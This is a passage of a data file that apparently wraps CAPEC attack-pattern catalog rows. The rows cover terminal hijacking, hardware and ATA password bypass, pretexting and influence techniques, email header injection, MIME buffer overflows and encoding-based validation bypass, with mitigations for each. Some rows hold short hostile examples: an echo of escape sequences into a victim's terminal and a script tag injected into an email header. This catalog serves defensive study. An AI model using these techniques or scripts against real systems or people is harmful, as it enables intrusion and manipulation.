policies::Design: Input validation routines should check and enforce both input data types and content against a positive specification. In regards to IP addresses, this should include the authorized manner for the application to represent IP addresses and not accept user specified IP addresses and IP address formats (such as ranges)::Implementation: Perform input validation for all remote content.::\",\"::An adversary identifies an application server that applies a security policy based on the domain and application name. For example, the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by using the IP address of the host instead (http://192.168.0.1:8080/application), the application authentication and authorization controls may be bypassed. The adversary relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.::\",\"::291::173::\",\"\",\"\","
  },
  "doc-fca23ab76c5c259fb676ec04e41f03e8": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n40,\"Manipulating Writeable Terminal Devices\",Standard,Draft,\"This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify attacker-writable terminals] Determine if users TTYs are writable by the attacker.:TECHNIQUE:Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.:TECHNIQUE:Attempt to write to other user TTYs. This approach could leave a trail or alert a user.::STEP:2:PHASE:Exploit:DESCRIPTION:[Execute malicious commands] Using one or more vulnerable TTY, execute commands to achieve various impacts.:TECHNIQUE:Commands that allow reading or writing end user files can be executed.::\",\"::User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user's terminals.::\",\"::SKILL:Ability to discover permissions on terminal devices. Of course, brute force can also be used.:LEVEL:Low::\",\"::Access to a terminal on the target network::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Design: Ensure that terminals are only writeable by named owner user and/or administrator::Design: Enforce principle of least privilege::\",\"::Any system that allows other peers to write directly to its terminal process is vulnerable to this type of attack. If the terminals are available through being over-privileged (i.e. world-writable) or the attacker is an administrator, then a series of commands in this format can be used to echo commands out to victim terminals. $echo -e 033[30m033132 > /dev/ttyXX where XX is the tty number of the user under attack. This will paste the characters to another terminal (tty). Note this technique works only if the victim's tty is world writable (which it may not be). That is one reason why programs like write(1) and talk(1) in UNIX systems need to run setuid. [REF-1] If the victim continues to hit enter and execute the commands, there are an endless supply of vectors available to the attacker, copying files, open up network connections, ftp out to servers, and so on.::\",\"::77::\",\"\",\"\",\n400,\"RFID Chip Deactivation or Destruction\",Detailed,Draft,\"An attacker uses methods to deactivate a passive RFID tag for the purpose of rendering the tag, badge, card, or object containing the tag unresponsive. RFID tags are used primarily for access control, inventory, or anti-theft devices. The purpose of attacking the RFID chip is to disable or damage the chip without causing damage to the object housing it.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:395::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n401,\"Physically Hacking Hardware\",Standard,Stable,\"An adversary exploits a weakness in access control to gain access to currently installed hardware and precedes to implement changes or secretly replace a hardware component which undermines the system's integrity for the purpose of carrying out an attack.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:440::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::A malicious subcontractor or subcontractor's employee that is responsible for system maintenance secretly replaces a hard drive with one containing malicious code that will allow for backdoor access once deployed.::\",\"::1263::\",\"\",\"\",\n402,\"Bypassing ATA Password Security\",Detailed,Draft,\"An adversary exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:401::\",\"\",\"::Access to the system containing the ATA Drive so that the drive can be physically removed from the system.::\",\"\",\"\",\"\",\"\",\"::Avoid using ATA password security when possible.::Use full disk encryption to protect the entire contents of the drive or sensitive partitions on the drive.::Leverage third-party utilities that interface with self-encrypting drives (SEDs) to provide authentication, while relying on the SED itself for data encryption.::\",\"::The A-FF Repair Station tool is a data recovery utility that can be used for ATA password removal (both High and Maximum level) and firmware area recovery. An adversary with access to this tool could reset the ATA password to bypass this security feature and unlock the hard drive. The adversary could then obtain any data contained within the drive. [REF-702]::An adversary gains physical access to the targeted hard drive and installs it into a system that does not support ATA security features. Once the drive is installed in the feature-lacking system, the adversary is able to reset the hard drive password via the BIOS. As a result, the adversary is able to bypass ATA password security and access content on the drive.::\",\"::285::\",\"\",\"\",\n406,\"Dumpster Diving\",Detailed,Stable,\"An adversary cases an establishment and searches through trash bins, dumpsters, or areas where company information may have been accidentally discarded for information items which may be useful to the dumpster diver. The devastating nature of the items and/or information found can be anything from medical records, resumes, personal photos and emails, bank statements, account details or information about software, tech support logs and so much more, including hardware devices. By collecting this information an adversary may be able to learn important facts about the person or organization that play a role in helping the adversary in their attack.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:150::NATURE:CanPrecede:CAPEC ID:163::NATURE:CanPrecede:CAPEC ID:675::\",\"\",\"::An adversary must have physical access to the dumpster or downstream processing facility.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Documents and materials improperly disposed of can lead to information disclosure if an adversary comes across it.::\",\"\",\"\",\"\",\"\",\"\",\n407,\"Pretexting\",Standard,Draft,\"An adversary engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the adversary's interests. During a pretexting attack, the adversary creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie; in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:416::NATURE:ChildOf:CAPEC ID:410::NATURE:CanPrecede:CAPEC ID:163::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the pretext that would influence the actions of the specific target.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Depending on the adversary's intentions and the specific nature their actions/requests, a successful pretexting attack can result in the compromise to the confidentiality of sensitive information in a variety of contexts.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.::\",\"::The adversary dresses up like a jogger and runs in place by the entrance of a building, pretending to look for their access card. Because the hood obscures their face, it may be possible to solicit someone inside the building to let them inside.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1589:ENTRY NAME:Gather Victim Identity Information::\",\"\",\n41,\"Using Meta-characters in E-mail Headers to Inject Malicious Payloads\",Detailed,Draft,\"This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs. Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:242::NATURE:ChildOf:CAPEC ID:134::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify and characterize metacharacter-processing vulnerabilities in email headers] An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.:TECHNIQUE:Use an automated tool (fuzzer) to create malicious emails headers containing metacharacter-based payloads.:TECHNIQUE:Manually tampering email headers to inject malicious metacharacter-based payload content in them.::STEP:2:PHASE:Exploit:DESCRIPTION:An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.:TECHNIQUE:Send emails with specifically-constructed, metacharacter-based malicious payloads in the email headers to targeted systems running email processing applications identified as vulnerable during the Experiment Phase.::\",\"::This attack targets most widely deployed feature rich email applications, including web based email programs.::\",\"::SKILL:To distribute email:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Design: Perform validation on email header data::Implementation: Implement email filtering solutions on mail server or on MTA, relay server.::Implementation: Mail servers that perform strict validation may catch these attacks, because metacharacters are not allowed in many header variables such as dns names::\",\"::To:<someone@example.com>From:<badguy@example.com>Header<SCRIPT>payme</SCRIPT>def: whatever::Meta-characters are among the most valuable tools attackers have to deceive users into taking some action on their behalf. E-mail is perhaps the most efficient and cost effective attack distribution tool available, this has led to the phishing pandemic. Meta-characters like w s d ^ can allow the attacker to escape out of the expected behavior to execute additional commands. Escaping out the process (such as email client) lets the attacker run arbitrary code in the user's process.::\",\"::150::88::697::\",\"\",\"\",\n410,\"Information Elicitation\",Meta,Draft,\"An adversary engages an individual using any combination of social engineering methods for the purpose of extracting information. Accurate contextual and environmental queues, such as knowing important information about the target company or individual can greatly increase the success of the attack and the quality of information gathered. Authentic mimicry combined with detailed knowledge increases the success of elicitation attacks.\",\"\",,Low,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n412,\"Pretexting via Customer Service\",Detailed,Draft,\"An adversary engages in pretexting behavior, assuming the role of someone who works for Customer Service, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. One example of a scenario such as this would be to call an individual, articulate your false affiliation with a credit card company, and then attempt to get the individual to verify their credit card number.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:407::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n413,\"Pretexting via Tech Support\",Detailed,Draft,\"An adversary engages in pretexting behavior, assuming the role of a tech support worker, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. An adversary who uses social engineering to impersonate a tech support worker can have devastating effects on a network. This is an effective attack vector, because it can give an adversary physical access to network computers. It only takes a matter of seconds for someone to compromise a computer with physical access. One of the best technological tools at the disposal of a social engineer, posing as a technical support person, is a USB thumb drive. These are small, easy to conceal, and can be loaded with different payloads depending on what task needs to be done. However, this form of attack does not require physical access as it can also be effectively carried out via phone or email.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:407::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n414,\"Pretexting via Delivery Person\",Detailed,Draft,\"An adversary engages in pretexting behavior, assuming the role of a delivery person, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. Impersonating a delivery person is an effective attack and an easy attack since not much acting is involved. Usually the hardest part is looking the part and having all of the proper credentials, papers and deliveries in order to be able to pull it off.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:407::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n415,\"Pretexting via Phone\",Detailed,Draft,\"An adversary engages in pretexting behavior, assuming some sort of trusted role, and contacting the targeted individual or organization via phone to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. This is the most common social engineering attack. Some of the most commonly effective approaches are to impersonate a fellow employee, impersonate a computer technician or to target help desk personnel.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:407::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n416,\"Manipulate Human Behavior\",Meta,Stable,\"An adversary exploits inherent human psychological predisposition to influence a targeted individual or group to solicit information or manipulate the target into performing an action that serves the adversary's interests. Many interpersonal social engineering techniques do not involve outright deception, although they can; many are subtle ways of manipulating a target to remove barriers, make the target feel comfortable, and produce an exchange in which the target is either more likely to share information directly, or let key information slip out unintentionally. A skilled adversary uses these techniques when appropriate to produce the desired outcome. Manipulation techniques vary from the overt, such as pretending to be a supervisor to a help desk, to the subtle, such as making the target feel comfortable with the adversary's speech and thought patterns.\",\"\",Medium,Medium,\"\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attack patterns that manipulate human behavior can result in a wide variety of consequences and potentially affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.::\",\"\",\"\",\"\",\"\",\n417,\"Influence Perception\",Standard,Stable,\"The adversary uses social engineering to exploit the target's perception of the relationship between the adversary and themselves. This goal is to persuade the target to unknowingly perform an action or divulge information that is advantageous to the adversary.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:416::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"::There are no necessary resources required for this attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"\",\"\",\"\",\"\",\n418,\"Influence Perception of Reciprocation\",Detailed,Draft,\"An adversary uses a social engineering techniques to produce a sense of obligation in the target to perform a certain action or concede some sensitive or key piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. There are various techniques for fostering a sense of obligation to reciprocate or concede during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:417::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"::An adversary develops a relationship with the target to foster a feeling of obligation in them to perform a certain action or concede some information. A perception of obligation/concession means that the target feels they need to behave in some way or perform some sort of action due to being morally or legally bound to do so.::\",\"\",\"\",\"\",\n42,\"MIME Conversion\",Detailed,Draft,\"An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target mail server] The adversary identifies a target mail server that they wish to attack.:TECHNIQUE:Use Nmap on a system to identify a mail server service.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine viability of attack] Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).::STEP:3:PHASE:Experiment:DESCRIPTION:[Find injection vector] Identify places in the system where vulnerable MIME conversion routines may be used.::STEP:4:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts e-mail messages with special headers that will cause a buffer overflow for the vulnerable MIME conversion routine. The intent of this attack is to leverage the overflow for execution of arbitrary code and gain access to the mail server machine, so the adversary will craft an email that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.::\",\"::The target system uses a mail server.::Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system.::\",\"::SKILL:It may be trivial to cause a DoS via this attack pattern:LEVEL:Low::SKILL:Causing arbitrary code to execute on the target system.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Stay up to date with third party vendor patches::Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file. For example, a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration): Mlocal, P=/usr/libexec/mail.local, F=lsDFMAw5:/|@qrmn, S=10/30, R=20/40,T=DNS/RFC822/X-Unix,A=mail -d $u Mprog, P=/bin/sh, F=lsDFMoqeu, S=10/30, R=20/40,D=$z:/,T=X-Unix,A=sh -c $u This can be achieved for the Mlocal and Mprog Mailers by modifying the .mc file to include the following lines: define(`LOCAL_MAILER_FLAGS',ifdef(`LOCAL_MAILER_FLAGS',`translit(LOCAL_MAILER_FLAGS, `9')',`rmn')) define(`LOCAL_SHELL_FLAGS',ifdef(`LOCAL_SHELL_FLAGS',`translit(LOCAL_SHELL_FLAGS, `9')',`eu')) and then rebuilding the sendmail.cf file using m4(1). From Exploiting Software, please see reference below.::Use the sendmail restricted shell program (smrsh)::Use mail.local::\",\"::A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges. Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild.See also: CVE-1999-0047::\",\"::120::119::74::20::\",\"\",\"\",\n420,\"Influence Perception of Scarcity\",Detailed,Stable,\"The adversary leverages a perception of scarcity to persuade the target to perform an action or divulge information that is advantageous to the adversary. By conveying a perception of scarcity, or a situation of limited supply, the adversary aims to create a sense of urgency in the context of a target's decision-making process.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:417::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"::An adversary sends an email to a target about a limited-time opportunity to claim a considerable monetary reward. The email contains a link to a site which the adversary says is only active for a short time and to the first person to claim it. By convincing the user of the scarcity of the monetary reward, the adversary aims to persuade them to click on the malicious link in the email.::\",\"\",\"\",\"\",\n421,\"Influence Perception of Authority\",Detailed,Stable,\"An adversary uses a social engineering technique to convey a sense of authority that motivates the target to reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization, an adversary may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the adversary.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:417::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"::The adversary calls the target and announces that they are the head of IT at the target's company. The adversary goes on to say that there has been a technical issue and they need the target's login credentials for their account. By convincing the target of their authority, the adversary hopes the target will reveal the sensitive information.::\",\"\",\"\",\"\",\n422,\"Influence Perception of Commitment and Consistency\",Detailed,Stable,\"An adversary uses social engineering to convince the target to do minor tasks as opposed to larger actions. After complying with a request, individuals are more likely to agree to subsequent requests that are similar in type and required effort.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:417::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::Individuals should avoid complying with suspicious requests.::\",\"\",\"\",\"\",\"\",\n423,\"Influence Perception of Liking\",Detailed,Stable,\"The adversary influences the target's actions by building a relationship where the target has a liking to the adversary. People are more likely to be influenced by people of whom they are fond, so the adversary attempts to ingratiate themself with the target via actions, appearance, or a combination thereof.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:417::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the types of things that the target likes.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"\",\"\",\"\",\"\",\n424,\"Influence Perception of Consensus or Social Proof\",Detailed,Draft,\"The adversary influences the target's actions by leveraging the inherent human nature to assume behavior of others is appropriate. In situations of uncertainty, people tend to behave in ways they see others behaving. The adversary convinces the target of adopting behavior or actions that is advantageous to the adversary.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:417::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"\",\"\",\"\",\"\",\n425,\"Target Influence via Framing\",Standard,Draft,\"An adversary uses framing techniques to contextualize a conversation so that the target is more likely to be influenced by the adversary's point of view. Framing is information and experiences in life that alter the way we react to decisions we must make. This type of persuasive technique exploits the way people are conditioned to perceive data and its significance, while avoiding negative or avoidance responses from the target. Rather than a specific technique framing is a methodology of conversation that slowly encourages the target to adopt to the adversary's perspective. One technique of framing is to avoid the use of the word No and to contextualize responses in a manner that is positive. When performed skillfully the target is much more likely to volunteer information or perform actions favorable to the adversary.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:416::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Successful attacks that influence the target via framing into performing an action or sharing sensitive information can result in a variety of consequences that negatively affect the confidentiality of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::Avoid sharing unnecessary information during interactions beyond what is absolutely required for effective communication.::\",\"\",\"\",\"\",\"\",\n426,\"Influence via Incentives\",Standard,Stable,\"The adversary incites a behavior from the target by manipulating something of influence. This is commonly associated with financial, social, or ideological incentivization. Examples include monetary fraud, peer pressure, and preying on the target's morals or ethics. The most effective incentive against one target might not be as effective against another, therefore the adversary must gather information about the target's vulnerability to particular incentives.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:416::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the incentives that would influence the actions of the specific target.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that successfully incentivize the target into performing an action beneficial to the adversary can result in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"\",\"\",\"\",\"\",\n427,\"Influence via Psychological Principles\",Standard,Draft,\"The adversary shapes the target's actions or behavior by focusing on the ways human interact and learn, leveraging such elements as cognitive and social psychology. In a variety of ways, a target can be influenced to behave or perform an action through capitalizing on what scholarship and research has learned about how and why humans react to specific scenarios and cues.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:416::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Attacks that successfully influence the target into performing an action via psychological principles can result in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.::\",\"\",\"\",\"\",\"\",\n428,\"Influence via Modes of Thinking\",Detailed,Draft,\"The adversary tailors their communication to the language and thought patterns of the target thereby weakening barriers or reluctance to communication. This method is a way of building rapport with a target by matching their speech patterns and the primary ways or dominant senses with which they make abstractions. This technique can be used to make the target more receptive to sharing information because the adversary has adapted their communication forms to match those of the target. When skillfully employed, the target is likely to be unaware that they are being manipulated.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:427::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n429,\"Target Influence via Eye Cues\",Detailed,Draft,\"The adversary gains information via non-verbal means from the target through eye movements.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:427::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n43,\"Exploiting Multiple Input Interpretation Layers\",Detailed,Draft,\"An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a layer of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: <parser1> --> <input validator> --> <parser2>. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application/system inputs where bypassing input validation is desired] The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where they want to bypass it.:TECHNIQUE:While using an application/system, the attacker discovers an input where validation is stopping them from performing some malicious or unauthorized actions.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine which character encodings are accepted by the application/system] The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.:TECHNIQUE:Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '':TECHNIQUE:Determine whether URL encoding is accepted by the application/system.:TECHNIQUE:Determine whether UTF-8 encoding is accepted by the application/system.:TECHNIQUE:Determine whether UTF-16 encoding is accepted by the application/system.:TECHNIQUE:Determine if any other encodings are accepted by the application/system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Combine multiple encodings accepted by the application.] The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.:TECHNIQUE:Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: .. With two parsing layers, this may get converted to . after the first parsing layer, and then, to . after the second. If the input validation layer is between the two parsing layers, then .. might pass a test for .. but still get converted to .. afterwards. This may enable directory traversal attacks.:TECHNIQUE:Combine multiple encodings and observe the effects. For example, the attacker might encode . as ., and then, encode . as &#92;&#46;, and 